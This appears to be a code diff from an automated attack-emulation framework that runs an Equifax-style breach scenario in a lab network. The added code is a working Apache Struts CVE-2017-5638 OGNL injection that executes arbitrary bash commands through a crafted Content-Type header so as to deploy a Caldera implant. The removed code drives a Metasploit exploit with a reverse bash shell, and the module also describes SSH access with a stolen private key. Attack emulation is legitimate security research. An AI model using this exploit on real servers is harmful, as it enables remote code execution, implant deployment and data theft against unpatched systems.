@@ -2,12 +2,10 @@
 Low-level command primitives: the underlying operations task agents use to act
 (run a command on a host, read a file, etc.).
 
-These are the verified "hands" ported from the standalone baseline PoC
-(equifax/webserver/attack/runners.py):
-
 - CommandRunner : the shared interface -- run ONE command, return its output.
-- WebShell      : a hand on the webserver, reached through the Struts bug via Metasploit.
-- SshRunner     : a hand on the database, reached over SSH with a stolen private key.
+- WebShell      : a hand on the webserver via direct Struts CVE-2017-5638 OGNL injection.
+- SshRunner     : a hand on a host reached over SSH with a stolen private key.
+- CncRunner     : a hand on a host with a live Caldera implant (post-exploitation C&C).
 
 The task agents (FindInfo / LateralMove / Exfiltrate) build on these and write
 their results back into the EnvironmentStateService.
@@ -15,6 +13,7 @@ their results back into the EnvironmentStateService.
 
 import shlex
 import subprocess
+import urllib.request
 from abc import ABC, abstractmethod
 
 
@@ -26,17 +25,17 @@ class CommandRunner(ABC):
         raise NotImplementedError
 
 
-# Markers we wrap around the real output so we can pull it out of Metasploit's
-# noisy logs. They just need to be words unlikely to collide with real output.
-_BEGIN = "___INCALMO_BEGIN___"
-_END = "___INCALMO_END___"
-
-
 class WebShell(CommandRunner):
     """
-    A 'hand' on the WEBSERVER, reached through the Struts bug via Metasploit.
+    A 'hand' on the webserver via direct Struts CVE-2017-5638 OGNL injection.
 
-    Each run() drives Metasploit once: exploit -> shell -> run one command.
+    Sends a crafted Content-Type HTTP header that triggers OGNL evaluation on
+    the Struts Jakarta multipart parser, executing an arbitrary shell command.
+    The command is base64-encoded before embedding to avoid quoting conflicts.
+
+    Fire-and-forget: does not wait for output (returns empty string).
+    Used to deploy the Caldera Sandcat implant; the implant beacons back
+    independently.
     """
 
     def __init__(
@@ -44,59 +43,41 @@ class WebShell(CommandRunner):
         rhost: str = "10.0.0.2",
         rport: int = 8080,
         target_uri: str = "/fileupload/upload.action",
-        docker_network: str = "equifax-seg_extnet",
-        msf_image: str = "metasploitframework/metasploit-framework",
-        session_wait: int = 10,              # seconds to wait for the shell to call back
+        docker_network: str = "equifax-seg_extnet",  # kept for API compatibility
+        msf_image: str = None,                        # unused, kept for API compatibility
+        session_wait: int = None,                     # unused, kept for API compatibility
     ):
         self.rhost = rhost
         self.rport = rport
         self.target_uri = target_uri
-        self.docker_network = docker_network
-        self.msf_image = msf_image
-        self.session_wait = session_wait
 
     def run(self, command: str) -> str:
-        argv = self._build_tool_command(command)
-        result = subprocess.run(
-            argv,
-            capture_output=True,
-            text=True,
-            timeout=180,                      # msf startup (~30s) + wait + exploit
+        # The command must not contain single quotes (they conflict with OGNL
+        # string literals). agent_deploy_command() uses only double quotes.
+        ognl = (
+            "%{(#_='multipart/form-data')."
+            "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
+            "(#_memberAccess?(#_memberAccess=#dm):"
+            "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
+            "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
+            "(#ognlUtil.getExcludedPackageNames().clear())."
+            "(#ognlUtil.getExcludedClasses().clear())."
+            "(#context.setMemberAccess(#dm))))."
+            f"(#cmd='{command}')."
+            "(#cmds={'/bin/bash','-c',#cmd})."
+            "(#p=new java.lang.ProcessBuilder(#cmds))."
+            "(#p.redirectErrorStream(true)).(#p.start())}"
         )
-        return self._extract_output(result.stdout)
 
-    def _build_tool_command(self, command: str) -> list[str]:
-        # On the target shell: print BEGIN, run the real command, print END.
-        # Join with '&&' (not ';') because msfconsole treats ';' as its own
-        # command separator and would break the line.
-        wrapped = f"echo {_BEGIN} && {command} && echo {_END}"
-
-        msf_script = "; ".join([
-            "use exploit/multi/http/struts2_content_type_ognl",
-            f"set RHOSTS {self.rhost}",
-            f"set RPORT {self.rport}",
-            f"set TARGETURI {self.target_uri}",
-            "set payload cmd/unix/reverse_bash",
-            "run -j",                          # fire it; handler runs as a background job
-            f"sleep {self.session_wait}",      # wait for the target to connect back
-            f'sessions -c "{wrapped}"',        # run our command on the new shell session
-            "exit -y",
-        ])
-
-        return [
-            "docker", "run", "--rm",
-            "--network", self.docker_network,
-            self.msf_image,
-            "./msfconsole", "-q", "-x", msf_script,
-        ]
-
-    def _extract_output(self, raw: str) -> str:
-        # The markers also appear in Metasploit's "Running '...'" echo line, so
-        # take the text after the LAST begin marker, up to the next end marker.
-        if _BEGIN in raw and _END in raw:
-            return raw.split(_BEGIN)[-1].split(_END)[0].strip()
-        # Markers missing => something went wrong; hand back the raw log to debug.
-        return raw.strip()
+        url = f"http://{self.rhost}:{self.rport}{self.target_uri}"
+        req = urllib.request.Request(
+            url, data=b"x", headers={"Content-Type": ognl}
+        )
+        try:
+            urllib.request.urlopen(req, timeout=30)
+        except Exception:
+            pass  # response content doesn't matter; implant beacons independently
+        return ""
 
 
 class SshRunner(CommandRunner):
